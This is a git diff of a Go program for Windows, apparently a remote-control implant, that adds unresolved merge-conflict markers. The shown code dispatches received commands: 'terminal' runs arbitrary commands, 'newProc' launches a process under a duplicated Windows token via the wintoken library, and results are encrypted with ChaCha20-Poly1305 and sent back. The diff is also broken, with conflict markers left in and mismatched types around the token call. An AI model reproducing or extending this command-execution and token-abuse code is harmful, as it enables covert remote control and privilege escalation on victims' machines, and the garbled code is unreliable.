@@ -1,4 +1,4 @@
-
+// +build windows,amd64,go1.20,!cgo
 package main
 
 import (
@@ -20,6 +20,7 @@ import (
 	"time"
 
 	"golang.org/x/crypto/chacha20poly1305"
+<<<<<<< Updated upstream
 	"github.com/fourcorelabs/wintoken"
 )
 
@@ -33,6 +34,13 @@ func new_process_new_token(token int, path string){
 	cmd := exec.Command(path)
 	cmd.SysProcAttr = &syscall.SysProcAttr{Token: syscall.Token(token.Token())}
 }
+=======
+	//"golang.org/x/sys/windows"
+)
+
+
+
+>>>>>>> Stashed changes
 
 func chacha(pass string, msg string) (enc_block []byte) {
 
@@ -218,9 +226,17 @@ func main() {
 		case "terminal":
 			commandToRun := strings.Join(sb1, ",")
 			result = terminal(commandToRun)
+<<<<<<< Updated upstream
 		case "newProc":
 			path := sb1[1:]
 			new_process_new_token(0, path)
+=======
+		case "pid":
+		    pid := os.Getpid()
+		    result = fmt.Sprint(pid)
+		//case "groups":
+		//    result := getGroups()
+>>>>>>> Stashed changes
 		}
 		toSend := string(result)
 		fmt.Printf(toSend)
